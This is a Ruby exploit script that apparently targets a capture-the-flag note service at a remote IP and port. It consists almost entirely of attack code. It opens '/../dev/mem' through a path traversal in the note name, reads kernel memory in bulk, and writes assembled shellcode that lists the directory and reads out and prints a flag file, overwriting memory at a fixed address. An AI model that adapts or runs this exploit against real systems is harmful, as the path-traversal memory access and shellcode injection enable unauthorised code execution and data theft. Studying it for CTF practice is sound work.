#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '3.115.128.152', 3154
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6', checksec: false); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt
  z.gets "one:"
end

def int(v)
  z.puts v
  # z.write v.to_s.ljust(6, "a") + "\n"
end

def read(sz)
  pt
  int(2)
  z.gets "Size?"
  int(sz)
  z.readn(sz)
end

def write(data)
  pt
  int(1)
  z.gets "Size?"
  int(data.size)
  z.write data
end

z.gets('Name of note?')
z.puts("/../dev/mem");
0x39.times { |i|
  log.dump i
  read(0x10000)
}
read(0x3000)

sc = asm(shellcraft.ls)
sc += asm(shellcraft.pushstr('flag-6db0fa76a6b0') + shellcraft.syscall('SYS_open', 'rsp', 0x0))
sc += asm(shellcraft.syscall('SYS_read', 'rax', 'rsp', 0x30))
sc += asm(shellcraft.syscall('SYS_write', 1, 'rsp', 0x30))
# debug!
# pause
write(flat('a' * 0x60 + sc.ljust(0xa48-0x60, 'A'), 0x60393060).ljust(0x1000, 'A'))
# write('A' * 0x1000)
z.puts

z.interact
